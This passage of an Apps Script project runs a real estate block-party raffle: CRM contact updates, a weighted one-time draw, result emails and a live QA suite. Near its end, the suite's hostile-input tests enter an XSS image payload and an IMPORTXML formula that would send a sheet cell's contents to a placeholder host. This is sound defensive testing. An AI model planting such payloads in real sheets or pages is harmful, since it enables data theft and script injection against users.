  payload[CONSENT_CUSTOM_FIELD] = Utilities.formatDate(raffleNow_(), RAFFLE_TZ, 'yyyy-MM-dd');

  var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/people/' + id, {
    method: 'put',
    contentType: 'application/json',
    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
    payload: JSON.stringify(payload),
    muteHttpExceptions: true
  });
  var code = resp.getResponseCode();
  if (code < 200 || code >= 300) {
    return { ok: false, error: 'FUB PUT /v1/people/' + id + ' returned ' + code + ': ' +
                               resp.getContentText().slice(0, 400) };
  }

  var addedEmail = before.emails.map(raffleNorm_).indexOf(raffleNorm_(email)) === -1;
  var addedPhone = before.phones.map(rafflePhoneKey_).indexOf(rafflePhoneKey_(digits)) === -1;
  var addedTags  = mergedTags.filter(function (t) { return before.tags.indexOf(t) === -1; });

  try { raffleAddNote_(id, name, apiKey, test, { before: before, match: match.why,
        addedEmail: addedEmail ? email : null, addedPhone: addedPhone ? phone : null,
        addedTags: addedTags }); }
  catch (noteErr) { Logger.log('Raffle update note failed for person ' + id + ': ' + noteErr); }

  Logger.log('Raffle: UPDATED existing FUB contact ' + id + ' (matched on ' + match.why + ').');
  return { ok: true, personId: id, updated: true, matchedOn: match.why };
}

function raffleBackground_(name, email, phone) {
  return [
    'Entered the ' + RAFFLE_EVENT_NAME + ' prize drawing (' + RAFFLE_PRIZE_SHORT + ').',
    'ATTENDED the TSG Block Party on Saturday, September 19, 2026 (1342 N Hancock St, Philadelphia).',
    '',
    'Entry submitted: ' + raffleFmt_(raffleNow_()) + ' ET',
    'Name: ' + name,
    'Email: ' + email,
    'Phone: ' + phone,
    '',
    'EMAIL VERIFIED: this address was confirmed at entry -- a 6-digit code was',
    'emailed to it and typed back before the entry was accepted. The phone number',
    'was format- and plausibility-checked but NOT ownership-verified (no SMS).',
    '',
    'CONSENT: accepted the Official Rules and gave express written consent to be',
    'contacted by call, text and email (including autodialed/prerecorded messages)',
    'about real estate services. Consent language version: ' + RAFFLE_CONSENT_VERSION + '.'
  ].join('\n');
}

function raffleAddNote_(personId, name, apiKey, test, upd) {
  var lines = [
    'Met at the TSG Block Party, Sat 9/19/2026, 1342 N Hancock St. Entered the ' +
    RAFFLE_PRIZE_SHORT + ' drawing and consented to follow-up.',
    'Email address was verified at entry (a code was emailed and typed back).'
  ];

  if (upd) {
    // The whole point of the update path: whatever this overwrote or added is
    // written down here, so the record's previous state is never just lost.
    lines.push('', 'RECOGNISED AN EXISTING CONTACT — matched on ' + upd.match + '.',
                   'This entry UPDATED that contact rather than creating a second record.');
    var changes = [];
    if (upd.addedEmail) changes.push('  + email added: ' + upd.addedEmail);
    if (upd.addedPhone) changes.push('  + phone added: ' + upd.addedPhone);
    if (upd.addedTags && upd.addedTags.length) changes.push('  + tags added: ' + upd.addedTags.join(', '));
    lines.push('', changes.length ? 'What this entry added:' : 'Nothing new to add — we already had all of it.');
    if (changes.length) lines = lines.concat(changes);

    var b = upd.before || {};
    lines.push('', 'CONTACT AS IT WAS BEFORE THIS ENTRY (nothing here was removed):',
      '  Name:   ' + [b.firstName, b.lastName].join(' ').trim(),
      '  Emails: ' + ((b.emails || []).join(', ') || '(none)'),
      '  Phones: ' + ((b.phones || []).join(', ') || '(none)'),
      '  Tags:   ' + ((b.tags || []).join(', ') || '(none)'),
      '  Source: ' + (b.source || '(none)') + '  [left unchanged — original lead source is history]',
      '', 'Entered as: ' + name + ' / ' + (upd.addedEmail || '(existing email)') + ' / ' +
          (upd.addedPhone || '(existing phone)'));
  } else {
    lines.push('', 'New contact — no existing FUB record matched confidently on name + email + phone.',
                   'Warm event lead — worth a personal call, not just a drip.');
  }

  var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/notes', {
    method: 'post',
    contentType: 'application/json',
    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
    payload: JSON.stringify({
      personId: personId,
      subject: (test ? QA_TEST_PREFIX : '') + 'Block Party 2026 — raffle entry' +
               (upd ? ' (updated existing contact)' : ''),
      body: lines.join('\n'),
      isHtml: false
    }),
    muteHttpExceptions: true
  });
  var code = resp.getResponseCode();
  if (code < 200 || code >= 300) {
    Logger.log('Raffle note POST returned ' + code + ': ' + resp.getContentText().slice(0, 300));
  }
}

// Re-pushes any entry whose FUB write failed. Safe to run repeatedly — it only
// touches rows still marked failed, and rewrites their status on success.
function raffleRetryFubFailures() {
  var rows = raffleReadEntries_().filter(function (r) {
    return r.fubStatus.indexOf('failed') === 0 || r.fubStatus === 'pending';
  });
  var fixed = 0;
  rows.forEach(function (r) {
    var res = rafflePushToFub_(r.name, r.email, r.phone);
    raffleRecordFubOutcome_(r.row, res);
    if (res.ok) fixed++;
  });
  var msg = 'Retried ' + rows.length + ' entries; ' + fixed + ' now in FUB.';
  Logger.log(msg);
  return msg;
}

// ---------- The draw ----------
function raffleStoredWinner_(test) {
  var raw = PropertiesService.getScriptProperties().getProperty(raffleWinnerProp_(test));
  if (!raw) return null;
  try { return JSON.parse(raw); } catch (err) { return null; }
}

// Deliberately NOT repeatable. Once a winner is recorded it is returned as-is
// on every subsequent call, so a double-fired trigger, a refreshed admin page
// or a second tap can never re-roll a drawing that has already happened.
// `force` exists because the draw is deliberately once-only: whoever it lands
// on is the winner, and the only way back is raffleResetDrawDANGER() from the
// editor. That makes an accidental early tap on the admin bookmark -- at 4pm,
// with an hour of entries still to come and one name in the sheet -- expensive
// and embarrassing in a way nothing else here is. So a LIVE draw before the
// close time now has to be asked for twice (&force=1 on the admin URL).
//
// The 6:15 trigger passes force itself, so the real draw is never blocked by a
// few seconds' clock skew, and test mode is exempt entirely: rehearsing the
// draw at any hour is the whole point of the test tab.
function raffleDrawWinner_(test, force) {
  var props = PropertiesService.getScriptProperties();
  var existing = raffleStoredWinner_(test);
  if (existing) return { ok: true, alreadyDrawn: true, result: existing };

  if (!test && !force && Date.now() < new Date(RAFFLE_CLOSE_AT).getTime()) {
    return { ok: false, error: 'Entries are still open until ' +
      raffleFmt_(new Date(RAFFLE_CLOSE_AT)) + ' ET, and the draw cannot be undone ' +
      'once it runs. If you really mean to draw now, add &force=1 to this URL.' };
  }

  var lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) return { ok: false, error: 'Could not acquire the draw lock; try again.' };
  try {
    existing = raffleStoredWinner_(test);          // re-read inside the lock
    if (existing) return { ok: true, alreadyDrawn: true, result: existing };

    // Only rows that are actually worth something: an own entry (eligible the
    // moment the email was verified) or a referral the referred person actually
    // consented to. A pending-consent row earns nothing -- the entrant was told
    // plainly that the bonus lands when their referral says yes, and the draw
    // has to mean that.
    var entries = raffleReadEntries_(test).filter(function (e) {
      return e.status === RAFFLE_STATUS_ELIGIBLE;
    });
    if (!entries.length) {
      return { ok: false, error: 'No eligible entries — nothing to draw.' };
    }

    // WEIGHTED DRAW. Every eligible row becomes as many tickets as it is worth:
    // one for entering, RAFFLE_BONUS_TICKETS_PER_REFERRAL for a referral who
    // confirmed. The shuffle then runs over TICKETS, so somebody with a confirmed
    // referral genuinely has six times the chance rather than a nominal bonus.
    var tickets = [];
    entries.forEach(function (e) {
      var n = Math.max(1, Number(e.tickets) || 1);
      for (var t = 0; t < n; t++) tickets.push(e);
    });

    // Fisher-Yates over the ticket list, then de-duplicated by person below: the
    // winner is the first ticket drawn, and the backups are the next DIFFERENT
    // people, so one entrant cannot occupy two of the three picks just because
    // they hold more tickets.
    for (var i = tickets.length - 1; i > 0; i--) {
      var j = Math.floor(Math.random() * (i + 1));
      var tmp = tickets[i]; tickets[i] = tickets[j]; tickets[j] = tmp;
    }
    var pool = [], seen = {};
    tickets.forEach(function (e) {
      var key = e.emailKey || ('row' + e.row);
      if (seen[key]) return;
      seen[key] = true;
      pool.push(e);
    });

    // Carries the FUB ids and the referral, not just a name: the ops email links
    // straight through to both records, and the draw console shows who each pick
    // actually referred. Reading it back off the sheet later would be too late --
    // the stored draw record IS the audit trail.
    var slim = function (e) {
      return {
        name: e.name, email: e.email, phone: e.phone, row: e.row,
        fubId: e.fubId || '',
        referralName: e.referralName || '', referralEmail: e.referralEmail || '',
        referralPhone: e.referralPhone || '', referralRole: e.referralRole || '',
        referralTimeframe: e.referralTimeframe || '', referralFubId: e.referralFubId || ''
      };
    };
    var result = {
      test: !!test,
      drawnAt: raffleFmt_(raffleNow_()),
      totalEligible: entries.length,
      // Both numbers, because they answer different questions: how many entries
      // there were, and how many chances were in the draw.
      totalTickets: tickets.length,
      totalPeople: pool.length,
      winner: slim(pool[0]),
      backups: pool.slice(1, 1 + RAFFLE_BACKUP_COUNT).map(slim)
    };

    props.setProperty(raffleWinnerProp_(test), JSON.stringify(result));

    // Entries are closed and the result is recorded, so every referral still
    // unanswered is now definitively unanswered. Sweep them into FUB, flagged --
    // see raffleLogUnconfirmedReferrals_. Best-effort: a CRM problem must never
    // put the draw itself at risk, since the draw has already happened by here.
    try { raffleLogUnconfirmedReferrals_(test); }
    catch (sweepErr) { Logger.log('Unconfirmed-referral sweep failed: ' + sweepErr); }
    try { raffleWriteDrawTab_(result, test); } catch (tabErr) { Logger.log('Draw tab write failed: ' + tabErr); }
    try { raffleEmailResult_(result, test); } catch (mailErr) {
      Logger.log('Draw email failed: ' + mailErr);
      return { ok: true, alreadyDrawn: false, result: result, emailFailed: true };
    }
    return { ok: true, alreadyDrawn: false, result: result };
  } finally {
    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
  }
}

// The 6:15 trigger target. Thin on purpose: all the logic (and the
// already-drawn guard) lives in raffleDrawWinner_.
function raffleScheduledDraw() {
  var res = raffleDrawWinner_(false, true);   // the 6:15 trigger is always the LIVE draw
  if (!res.ok) {
    Logger.log('Scheduled draw did not complete: ' + res.error);
    try {
      sendErrorAlert('Raffle: 6:15 draw did NOT complete', res.error +
        '\n\nDraw manually from the admin link (raffleAdminLinks() in the editor).');
    } catch (alertErr) { /* nothing more we can do */ }
  }
}

function raffleWriteDrawTab_(result, test) {
  var ss = SpreadsheetApp.openById(
    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
  var tab = test ? 'Draw Result (TEST)' : 'Draw Result';
  var sh = ss.getSheetByName(tab) || ss.insertSheet(tab);
  sh.clear();
  var rows = [
    ['Event', (test ? QA_TEST_PREFIX : '') + RAFFLE_EVENT_NAME],
    ['Prize', RAFFLE_PRIZE_SHORT],
    ['Drawn at (ET)', result.drawnAt],
    ['Eligible entries', result.totalEligible],
    ['People in the draw', result.totalPeople],
    ['Tickets in the draw', result.totalTickets],
    [],
    ['WINNER', result.winner.name],
    ['Phone', result.winner.phone],
    ['Email', result.winner.email]
  ];
  result.backups.forEach(function (b, i) {
    rows.push([], ['Backup ' + (i + 1), b.name], ['Phone', b.phone], ['Email', b.email]);
  });
  sh.getRange(1, 1, rows.length, 2).setValues(rows.map(function (r) {
    return [r[0] === undefined ? '' : r[0], r[1] === undefined ? '' : r[1]];
  }));
  sh.getRange(8, 1, 1, 2).setFontWeight('bold').setFontSize(14);   // the WINNER row
}

function raffleEmailResult_(result, test) {
  var w = result.winner;
  var lines = [
    (test ? QA_TEST_PREFIX : '') + RAFFLE_EVENT_NAME + ' — RAFFLE RESULT',
    ''];
  if (test) {
    lines.push('*** THIS IS A TEST DRAW. Not the real winner. ***',
      'Drawn from the "' + RAFFLE_TEST_SHEET_NAME + '" tab. The real 6:15 draw is',
      'untouched and still pending.', '');
  }
  lines = lines.concat([
    'WINNER: ' + w.name,
    'Phone:  ' + w.phone,
    'Email:  ' + w.email,
    '',
    'Prize:            ' + RAFFLE_PRIZE_SHORT + ' (ARV ' + RAFFLE_PRIZE_ARV + ')',
    'Drawn at:         ' + result.drawnAt + ' ET',
    'Eligible entries: ' + result.totalEligible,
    'People:           ' + result.totalPeople,
    'Tickets:          ' + result.totalTickets +
      ' (1 per entrant, ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' per confirmed referral)',
    'Announce at:      ' + RAFFLE_ANNOUNCE_AT,
    ''
  ]);
  if (result.backups.length) {
    lines.push('BACKUPS (in order, if the winner has already left):');
    result.backups.forEach(function (b, i) {
      lines.push('  ' + (i + 1) + '. ' + b.name + ' — ' + b.phone + ' — ' + b.email);
    });
    lines.push('');
  }
  lines.push('Full entry list: https://docs.google.com/spreadsheets/d/' +
    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
  lines.push('');
  lines.push('This draw is recorded and is not repeatable — re-running the draw');
  lines.push('returns this same winner by design.');

  // HTML as of 2026-09-17, per Durand: all three picks, links into FUB for each
  // pick AND for the person they referred, and a link to the draw console, which
  // is where choosing/previewing/sending actually happens. The plain-text version
  // above is kept and sent alongside -- it is what a watch or a text-only client
  // shows, and it is the one legible on bad signal in a crowd.
  //
  // In test mode this collapses to QA_TEST_NOTIFY_EMAIL only -- Ryan does not
  // get paged about a rehearsal.
  var consoleUrl = '';
  try {
    var adminKey = PropertiesService.getScriptProperties().getProperty(RAFFLE_ADMIN_PROP);
    consoleUrl = ScriptApp.getService().getUrl() + '?form=raffle&action=console&key=' +
      encodeURIComponent(adminKey || '') + (test ? '&test=1' : '');
  } catch (urlErr) { Logger.log('raffleEmailResult_: could not build the console URL: ' + urlErr); }

  MailApp.sendEmail({
    to: qaTestRecipients_(RAFFLE_RESULT_EMAIL.split(',')).join(','),
    name: 'TSG Block Party Raffle',
    // People and tickets, not the row count. totalEligible is rows, and a row is
    // not an entrant: "(4 entries)" for three people holding eight tickets is
    // the same misreading the status page used to print.
    subject: (test ? QA_TEST_PREFIX : '🏈 ') + 'Block Party Raffle Winner: ' + w.name +
             ' (' + result.totalPeople + ' people, ' + result.totalTickets + ' tickets)',
    htmlBody: raffleResultHtml_(result, test, consoleUrl),
    body: lines.join('\n')
  });
}

// Break-glass: clears the recorded winner so a draw can be re-run. Only for a
// genuine mistake (e.g. the draw fired before entries closed). Deliberately
// not reachable from any URL — it has to be run by hand from the editor.
// Test-tab only: lets the QA suite draw more than once in a single run. Never
// touches the live winner -- there is a separate, deliberately awkward
// raffleResetDrawDANGER() for that.
function raffleResetDrawDANGER_TEST_() {
  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_PROP);
}

function raffleResetDrawDANGER() {
  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_WINNER_PROP);
  Logger.log('Recorded LIVE winner cleared. The next live draw will pick a NEW winner.');
}

// Wipes the test tab and the test winner so a rehearsal can be run again from
// clean. Touches nothing live -- safe to run as often as you like, including
// during the party.
function raffleResetTest() {
  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_PROP);
  var sh = raffleSheet_(true);
  var last = sh.getLastRow();
  if (last > 1) sh.deleteRows(2, last - 1);
  var ss = SpreadsheetApp.openById(
    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
  var tab = ss.getSheetByName('Draw Result (TEST)');
  if (tab) ss.deleteSheet(tab);
  var msg = 'Test entries and test draw cleared. Live entries and the live draw are untouched.';
  Logger.log(msg);
  return msg;
}

// ---------- Live QA suite ----------
// Run raffleRunQaSuite() from the editor. It drives the REAL code paths end to
// end -- the same raffleHandleSubmission_ the web form calls, real sheet writes,
// real FUB writes, a real draw -- and prints a pass/fail report.
//
// Everything it does happens in TEST MODE, so: entries land on the "Test
// Entries" tab and can never be drawn as the real winner, FUB records are
// prefixed and tagged, and the draw writes the TEST winner property. The live
// Entries tab and the real 6:15 draw are asserted untouched at the end.
//
// Test mode is entered through the project's own sanctioned path -- mint a
// token into the cache, then let setQaTestModeFromPayload_ flip the flag -- not
// by assigning QA_TEST_MODE_ACTIVE_ directly, which Code.gs reserves to itself.
//
// Verification codes are read back out of the script cache rather than from the
// inbox, because a self-test cannot open email. The emails are still genuinely
// sent, to plus-addressed variants of Durand's address, so they are deliverable
// and land somewhere real rather than bouncing off an invented domain.
var RAFFLE_QA_ADDRESS_BASE = 'durand+raffleqa';
var RAFFLE_QA_DOMAIN = '@thestawaszgroup.com';

function raffleRunQaSuite() {
  return raffleQaRun_(true);
}

// Same suite, but leaves the test data in place so you can look at the sheet and
// the FUB records afterwards. Run raffleResetTest() when you are done.
function raffleRunQaSuiteAndKeepData() {
  return raffleQaRun_(false);
}

function raffleQaRun_(cleanUp) {
  var log = [];
  var pass = 0, fail = 0;
  function check(name, cond, detail) {
    if (cond) { pass++; log.push('PASS  ' + name); }
    else { fail++; log.push('FAIL  ' + name + (detail ? '  -- ' + detail : '')); }
    return cond;
  }
  function section(t) { log.push('', '--- ' + t + ' ---'); }

  var props = PropertiesService.getScriptProperties();
  if (!props.getProperty(RAFFLE_SHEET_PROP)) {
    throw new Error('Run setupRaffle() first — there is no entries sheet yet.');
  }

  log.push('RAFFLE QA SUITE — ' + raffleFmt_(raffleNow_()) + ' ET');
  log.push('Everything below runs in TEST MODE against the real code paths.');
  log.push('Real FUB records ARE created; they are prefixed "' + QA_TEST_PREFIX.trim() +
           '" and tagged "' + QA_TEST_TAG + '".');

  // Enter test mode through the project's own mechanism.
  var token = Utilities.getUuid();
  CacheService.getScriptCache().put(QA_TEST_CACHE_PREFIX + token, '1', QA_TEST_TOKEN_TTL_SECONDS);
  setQaTestModeFromPayload_({ qaTestToken: token });
  if (!check('test mode is active', isQaTestMode_(),
      'without this every assertion below would be writing to LIVE data — aborting')) {
    return log.join('\n');
  }

  // Start from clean test state so counts are meaningful.
  try { raffleResetTest(); } catch (e) { log.push('(note: could not pre-clear test data: ' + e + ')'); }

  var liveBefore = raffleReadEntries_(false).length;
  log.push('Live entries before: ' + liveBefore + ' (this number must not change)');

  var stamp = String(Date.now()).slice(-6);
  function person(n, phone) {
    return {
      fullName: 'QA Tester' + n + ' Blockparty',
      email: RAFFLE_QA_ADDRESS_BASE + stamp + '-' + n + RAFFLE_QA_DOMAIN,
      phone: phone,
      consent: 'Yes'
    };
  }
  // raffleHandleSubmission_ answers with a ContentService TextOutput -- the same
  // object doPost hands back to the browser. It carries NO payload properties,
  // only getContent(), so anything inspecting the result has to parse it. Reading
  // .ok straight off it silently yields undefined, which is exactly how the first
  // run of this suite reported 29 false failures against working code.
  function json(res) {
    if (!res) return {};
    if (typeof res.getContent === 'function') {
      try { return JSON.parse(res.getContent()); } catch (err) { return {}; }
    }
    return res;
  }
  function request(d) { return json(raffleHandleSubmission_(Object.assign({ step: 'request' }, d))); }
  function codeFor(vid) {
    var raw = CacheService.getScriptCache().get(RAFFLE_PENDING_PREFIX + vid);
    return raw ? JSON.parse(raw).code : null;
  }
  // Step 1+2 only: details -> emailed code -> verified session. Nothing is
  // entered; under the referral rules an entry does not exist yet.
  function verifyFully(d) {
    var r1 = request(d);
    if (!r1.ok || !r1.needsCode) return r1;
    return json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: codeFor(r1.vid) }));
  }

  // A referral for entrant `n`, distinct per entrant: one entry per referred
  // PERSON is the rule, so reusing one referral across entrants would (correctly)
  // be refused and would test the wrong thing.
  function referralFor(n, phone) {
    return {
      referralName: 'QA Referral' + n + ' Blockparty',
      referralEmail: RAFFLE_QA_ADDRESS_BASE + stamp + '-ref' + n + RAFFLE_QA_DOMAIN,
      referralPhone: phone,
      referralRole: (String(n).length % 2 === 0) ? 'Seller' : 'Buyer',
      referralTimeframe: raffleDefaultTimeframe_(raffleTimeframes_()) || '',
      consent: 'Yes'
    };
  }

  // The whole journey, the way a real pair of people drive it. `opts.skipConsent`
  // stops at "emailed, waiting on them", which is the state most of the day will
  // actually be in.
  function enterFully(d, n, refPhone, opts) {
    opts = opts || {};
    var v = verifyFully(d);
    if (!v.ok || !v.verified) return v;
    var ref = referralFor(n === undefined ? '1' : n, refPhone || '(215) 555-9101');
    var staged = json(raffleHandleSubmission_(
      Object.assign({ step: 'referral', vid: v.vid }, ref)));
    if (!staged.ok || !staged.staged) return staged;
    var invited = json(raffleHandleSubmission_(
      { step: 'invite', vid: v.vid, token: staged.token }));
    if (opts.skipConsent) { invited.token = staged.token; return invited; }
    var done = json(raffleHandleSubmission_({
      step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
      referralName: ref.referralName, referralEmail: ref.referralEmail,
      referralPhone: ref.referralPhone, referralRole: ref.referralRole,
      referralTimeframe: ref.referralTimeframe
    }));
    done.token = staged.token;
    done.vid = v.vid;
    done.referral = ref;
    return done;
  }

  // ---- 1. Junk rejection -------------------------------------------------
  section('1. Junk rejection (nothing should be written or emailed)');
  [
    ['disposable email',        { email: 'x@mailinator.com' }],
    ['example.com',             { email: 'x@example.com' }],
    ['role address test@',      { email: 'test' + RAFFLE_QA_DOMAIN }],
    ['empty email',             { email: '' }],
    ['all-same digits',         { phone: '5555555555' }],
    ['1234567890',              { phone: '1234567890' }],
    ['N11 area code',           { phone: '9112345678' }],
    ['exchange starting 1',     { phone: '2151234567' }],
    ['reserved 555-01xx',       { phone: '(215) 555-0123' }],
    ['empty phone',             { phone: '' }],
    ['single-word name',        { fullName: 'Cher' }],
    ['consent not given',       { consent: 'No' }]
  ].forEach(function (c) {
    var res = request(Object.assign(person(9, '(215) 555-8901'), c[1]));
    check('rejects ' + c[0], res.ok === false, 'got: ' + JSON.stringify(res));
  });
  check('no junk entry reached the test sheet', raffleReadEntries_(true).length === 0);

  // ---- 2. Two-step verification ------------------------------------------
  section('2. Two-step verification');
  var a = person(1, '(215) 555-8101');
  var r1 = request(a);
  check('step 1 asks for a code', r1.ok === true && r1.needsCode === true, JSON.stringify(r1));
  check('step 1 wrote NOTHING yet', raffleReadEntries_(true).length === 0);
  var code = codeFor(r1.vid);
  check('a 6-digit code was issued', /^\d{6}$/.test(String(code)));
  var bad = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: '000000' }));
  check('a wrong code is refused', bad.ok === false, JSON.stringify(bad));
  check('a wrong code still wrote nothing', raffleReadEntries_(true).length === 0);
  var good = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
  check('the right code verifies them', good.ok === true && good.verified === true, JSON.stringify(good));
  check('verification hands back a session id', /^[0-9a-fA-F-]{36}$/.test(String(good.vid)));
  // Verification now enters them: one ticket, immediately. This is the change
  // that made a zero-entry drawing impossible.
  check('verification enters them with one ticket', raffleReadEntries_(true).length === 1);
  check('and that row is eligible straight away',
        raffleReadEntries_(true)[0].status === RAFFLE_STATUS_ELIGIBLE);
  check('with no referral attached yet', !raffleReadEntries_(true)[0].isReferralRow);
  check('the reply does not reveal whether they were already in FUB',
        !/found|existing|already a|welcome back/i.test(JSON.stringify(good)), JSON.stringify(good));
  var replay = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
  check('the code cannot be replayed', replay.ok === false);
  check('a replay mints no second free entry', raffleReadEntries_(true).length === 1);

  // ---- 3. The referral, and the consent it waits on ----------------------
  section('3. Referral -> invite -> consent');
  var refA = referralFor('1', '(215) 555-9101');
  var staged = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: good.vid }, refA)));
  check('the referral is staged', staged.ok === true && staged.staged === true, JSON.stringify(staged));
  check('a second row exists now', raffleReadEntries_(true).length === 2);
  var pendingRows = raffleReadEntries_(true).filter(function (r) {
    return r.status === RAFFLE_STATUS_PENDING; });
  check('the referral row is PENDING, worth nothing yet', pendingRows.length === 1,
        JSON.stringify(raffleReadEntries_(true).map(function (r) { return r.status; })));
  var earlyDraw = raffleDrawWinner_(true);
  check('the draw runs anyway, on their own entry alone',
        earlyDraw.ok === true && earlyDraw.result.totalTickets === 1,
        JSON.stringify(earlyDraw.ok && earlyDraw.result.totalTickets));
  raffleResetDrawDANGER_TEST_();

  var invited = json(raffleHandleSubmission_(
    { step: 'invite', vid: good.vid, token: staged.token }));
  check('the invite sends', invited.ok === true && invited.sent === true, JSON.stringify(invited));
  var resend = json(raffleHandleSubmission_(
    { step: 'invite', vid: good.vid, token: staged.token }));
  check('the invite cannot be sent twice', resend.alreadySent === true, JSON.stringify(resend));

  var consented = json(raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
    referralName: refA.referralName, referralEmail: refA.referralEmail,
    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
    referralTimeframe: refA.referralTimeframe }));
  check('the referral can consent', consented.ok === true && consented.confirmed === true,
        JSON.stringify(consented));
  var eligibleRows = raffleReadEntries_(true).filter(function (r) {
    return r.status === RAFFLE_STATUS_ELIGIBLE; });
  // Three eligible rows now: the entrant's own entry, the referral (worth its
  // bonus at last), and the referred person's OWN entry -- consenting enters
  // them too, off the same box.
  check('and only NOW is the referral worth its bonus', eligibleRows.length === 3,
        'got ' + eligibleRows.length);
  var tix = eligibleRows.reduce(function (n, r) { return n + (Number(r.tickets) || 1); }, 0);
  check('which is 1 + ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' + 1 tickets',
        tix === 2 + RAFFLE_BONUS_TICKETS_PER_REFERRAL, 'got ' + tix);
  var reConsent = json(raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
    referralName: refA.referralName, referralEmail: refA.referralEmail,
    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
    referralTimeframe: refA.referralTimeframe }));
  check('consenting twice changes nothing', reConsent.already === true, JSON.stringify(reConsent));
  check('still exactly three rows', raffleReadEntries_(true).length === 3,
        'got ' + raffleReadEntries_(true).length);

  // ---- 3b. One BONUS per REFERRED PERSON ---------------------------------
  section('3b. One bonus per referred person');
  var b = person('9', '(215) 555-8199');
  var vB = verifyFully(b);
  check('a second entrant verifies fine', vB.ok === true && vB.verified === true, JSON.stringify(vB));
  var stolen = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, refA)));
  check('they cannot refer someone already referred', stolen.ok === false, JSON.stringify(stolen));
  check('and the refusal does not say which check failed',
        !/already a contact|in our database|existing contact/i.test(String(stolen.error)),
        String(stolen.error));
  check('no extra referral row was written',
        raffleReadEntries_(true).filter(function (r) { return r.isReferralRow; }).length === 1);
  var self = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, referralFor('9', '(215) 555-8199'), {
    referralEmail: b.email, referralPhone: b.phone })));
  check('and they cannot refer themselves', self.ok === false, JSON.stringify(self));

  // ---- 4. More entrants + counts -----------------------------------------
  section('4. Additional entrants and counts');
  [['2','(215) 555-8102','(215) 555-9102'],
   ['3','(215) 555-8103','(215) 555-9103'],
   ['4','(267) 555-8104','(215) 555-9104']].forEach(function (p) {
    var res = enterFully(person(p[0], p[1]), p[0], p[2]);
    check('entrant ' + p[0] + ' accepted', res.ok === true && !res.already, JSON.stringify(res));
  });
  var people = {};
  raffleReadEntries_(true).filter(function (r) {
    return r.status === RAFFLE_STATUS_ELIGIBLE; }).forEach(function (r) {
      people[r.emailKey] = true; });
  var n = Object.keys(people).length;
  // NINE, not four. Four journeys above, each of which enters the entrant AND
  // the referral who consented, plus the extra entrant section 3b verified to
  // prove a person already referred cannot be referred again.
  check('nine distinct entrants on the test tab', n === 9, 'got ' + n);
  var statusOut = raffleStatusPage_(true);
  var statusHtml = String(typeof statusOut.getContent === 'function' ? statusOut.getContent() : statusOut);
  check('status page shows a count', /\b\d+\b/.test(statusHtml), 'count page showed no number');
  check('status page is labelled as test data', /TEST DATA/.test(statusHtml));

  // ---- 5. The draw --------------------------------------------------------
  section('5. Test draw');
  var draw = raffleDrawWinner_(true);
  check('draw succeeds', draw.ok === true, JSON.stringify(draw));
  if (draw.ok) {
    check('result is flagged as a test', draw.result.test === true);
    check('drew from all nine people', draw.result.totalPeople === 9,
          'got ' + draw.result.totalPeople);
    check('with more tickets than people (the referral bonus applied)',
          draw.result.totalTickets > draw.result.totalPeople,
          draw.result.totalTickets + ' tickets / ' + draw.result.totalPeople + ' people');
    // Either an entrant or one of the referrals who consented -- both are in it.
    check('winner is one of the QA people', /^QA /.test(draw.result.winner.name),
          draw.result.winner.name);
    check('the ticket count is reported', draw.result.totalTickets > 0,
          String(draw.result.totalTickets));
    check('two backups named', draw.result.backups.length === 2);
    var names = [draw.result.winner.name].concat(draw.result.backups.map(function (b) { return b.name; }));
    var uniq = names.filter(function (v, i) { return names.indexOf(v) === i; });
    check('winner and backups are distinct people', uniq.length === 3, names.join(', '));
    log.push('      winner drawn: ' + draw.result.winner.name + '  (' + draw.result.winner.phone + ')');
    var again = raffleDrawWinner_(true);
    check('a second draw is NOT a re-roll', again.alreadyDrawn === true);
    check('the same winner comes back', again.result.winner.name === draw.result.winner.name);
  }

  // ---- 5b. Hostile input (the parts only the real runtime can prove) ------
  // The sandbox suite (raffle/test/test_redteam.js) covers this class properly.
  // Two of its assumptions can only be checked against the real Google runtime,
  // so they are re-checked here: that Sheets really does treat the apostrophe
  // raffleSafeCell_ writes as a text marker rather than data, and that the
  // admin page really does render a hostile name inert.
  section('5b. Hostile input');
  var xssName = '<img src=x onerror=alert(1)> QA Tester ' + stamp;
  var xssRes = enterFully({ fullName: xssName,
    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-xss' + RAFFLE_QA_DOMAIN,
    phone: '(215) 555-8105', consent: 'Yes' }, 'xss', '(215) 555-9105');
  check('an entry with markup in the name is accepted (it is only text)', xssRes.ok === true,
        JSON.stringify(xssRes));
  var sOut = raffleStatusPage_(true);
  var sHtml = String(typeof sOut.getContent === 'function' ? sOut.getContent() : sOut);
  check('the admin page does not emit the raw markup',
        sHtml.indexOf('<img src=x onerror=alert(1)>') === -1,
        'STORED XSS — the admin page rendered entrant markup unescaped');

  var formulaName = '=IMPORTXML("https://example.invalid/?d="&C2,"//a") QA ' + stamp;
  var fRes = enterFully({ fullName: formulaName,
    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-csv' + RAFFLE_QA_DOMAIN,
